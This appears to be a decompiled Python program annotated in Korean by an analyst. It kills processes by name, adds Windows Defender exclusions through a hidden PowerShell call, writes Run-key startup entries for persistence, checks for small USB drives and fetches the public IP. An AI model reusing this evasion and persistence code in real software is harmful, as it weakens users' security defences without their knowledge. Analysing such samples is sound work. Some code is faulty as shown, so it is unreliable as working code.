import os
import psutil
import sys
from datetime import datetime, timedelta
import subprocess
import requests

# 현재 실행 드라이브 외의 이동식 usb 드라이브를 검사해 조건에 맞으면 TRUE반환
#todo 그 이걸로 안됨 실제 usb에서만 실행되게끔 파일을 옮긴다거나하면 절대 실행안되게끔
def get_danger_detection_status():
    is_danger = False
    # sys.executable은 실행 중인 Python 또는 패키지된 EXE의 실행 경로
    current_script_path = sys.executable
    current_drive = os.path.splitdrive(current_script_path)[0]
    # 빈 리스트[]는 장치 목록을 하나씩 담아 둘 공간.
    usb_devices = []
    # for는 목록의 요소를 하나씩 꺼내 반복. 여기서는 드라이브를 순회
    for part in psutil.disk_partitions():
        if current_drive not in part.device and (
            'removable' in part.opts or 'cdrom' in part.opts
        ):
            usb_devices.append(part.device)
    # for는 앞에서 골라 둔 장치들의 용량 확인
    for device in usb_devices:
        usage = psutil.disk_usage(device)
        if usage.total <= 137438953472:
            is_danger = True
    return is_danger

def is_admin():
    import platform
    os_kind = platform.system()
    if os_kind == 'Windows':
        import ctypes
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                return True
            return False
        finally:
            pass
    if os_kind == 'Darwin':
        return os.getuid() == 0
    print('Unsupported operating system')
    return False

# 특정 이름의 다른 프로세스를 발견하면 종료 요청
def check_and_terminate_process(process_name, max_excution_time=10, is_process_check=False):
    # os.getpid()는 현재 프로그램 자신의 PID를 가져와 자신을 종료 대상에서 제외
    own_pid = os.getpid()
    current_time = datetime.now()
    # psutil.process_iter는 실행 중인 프로세스 하나씩 나열
    for proc in psutil.process_iter(attrs=['pid', 'name', 'create_time']):
        try:
            if proc.info['name'] == process_name and proc.info['pid'] != own_pid:
                process_create_time = datetime.fromtimestamp(proc.info['create_time'])
                process_execution_time = current_time - process_create_time
                # is process가 true여도 pass만 있고 이후 terminate()가 실행돼 이르만 보고 안전한 검사 함수라고 이해하면 안됨
                if is_process_check:
                    pass
                proc.terminate()
        finally:
            pass

# 지정한 폴더를 Windows Defender 예외 목록에 추가하려는 함수.
def add_windows_defender_exclusion(path):
    try:
        # 이미 예외로 등록된 경로인지 먼저 확인하고 등록되어있으면 return으로 종료
        if check_windows_defender_exclusion(path):
            return
        # powershell Add-MpPreference 명령은 실제 Defender 보안 예외를 바꾸는 명령
        command = f'"Add-MpPreference -ExclusionPath {path} -Force"'
        # subprocess.Popen은 다른 프로그램을 실행(여기서는 powershell)
        result = subprocess.Popen([
            'powershell', '-NoLogo', '-NonInteractvie',
            '-WindowStyle',
            'hidden', '-NoProfile', '-Command', command,
        ], shell=True)
    finally:
        pass


# Defender 설정에서 특정 경로가 예외 목록에 잇는지 검사
# todo stderr에따른 다른 분기 처리 필요
def check_windows_defender_exclusion(path):
    command = f'"(Get-MpPreference).ExclusionPath -contains {path}"'
    try:
        result = subprocess.Popen([
            'powershell', '-NoLogo', '-NonInteractive',
            '-WindowStyle',
            'hidden', '-NoProfile', '-Command', command,
        ], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # communicate()는 외부 프로세스 종료 기다리고 출력 내용 받아옴
        stdout, stderr = result.communicate()
        # b'True'는 bytes임 stdout.strip()은 앞 뒤 공백 줄바꿈 제거
        if stdout.strip() == b'True':
            return True
        return False
    finally:
        pass

# UTF-8 텍스트 파일을 열어 내용을 기록 동일 파일 있을시 덮어씀
# todo 이거 삭제해도될듯 함수
def write_to_txt_file(filepath, content):
    try:
        # encoding='utf-8'은 한글을 포함한 문자열을 UTF-8로 저장하겠다는 뜻
        with open(filepath, 'w', encoding='utf-8') as file:
            file.write(content)
    finally:
        pass

# 텍스트 파일을 열어 읽지만, return content가 없어 호출자가 읽은 문자열을 받지못함 그럼 왜 쓴거임?
# 마찬가지로 삭제해도될듯
def read_from_txt_file(filepath):
    try:
        # with open(..., 'r')은 파일 읽기 모드. file.read()는 전체 내용을 문자열로 가져와
        with open(filepath, 'r', encoding='utf-8') as file:
            content = file.read()
        # 코드를 임의로 고치지 않아 return을 추가하지않음 실제 바이트 코드에서 함수가 어던 값을 반환하는지 원본 분석을 참고
        # 원본 bytecode에는 return content가 없었음
    finally:
        pass

# windows 시작 프로그램 레지스트리에서 특정 이름의 항목을 삭제
def remove_from_startup_registry(key_name):
    try:
        import winreg
        # HKLM은 컴퓨터 전체에 적용되는 레지스트리 루트
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        # winreg.OpenKey(..., KEY_ALL_ACCESS)는 레지스트리 키를 수정할 권한으로 열어
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
            winreg.DeleteValue(key, key_name)
    finally:
        pass

# 현재 사용자 시작 프로그램에 exe 경로를 등록해 Windows 로그인 시 실행할 수 있도록
def add_to_startup_registry(exe_path, key_name):
    try:
        import winreg
        # HKCU(HKEY_CURRENT_USER)는 현재 로그인 사용자의 레지스트리 설정
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
            # SetValueEx는 레지스트리에 이름과 값을 저장하는 함수
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
    finally:
        pass

# 외부 IP 조회 서비스를 호출해 현재 접속에 사용된 공인 IP 주소 문자열을 받아옴
def get_public_ip():
    try:
        # requests.get은 HTTP GET 요청을 전송. 별도 서버와 통신하는 함수이므로 네트워크 필요
        response = requests.get('https://checkip.amazonaws.com')
        public_ip = response.text.strip()
        return public_ip
    finally:
        pass
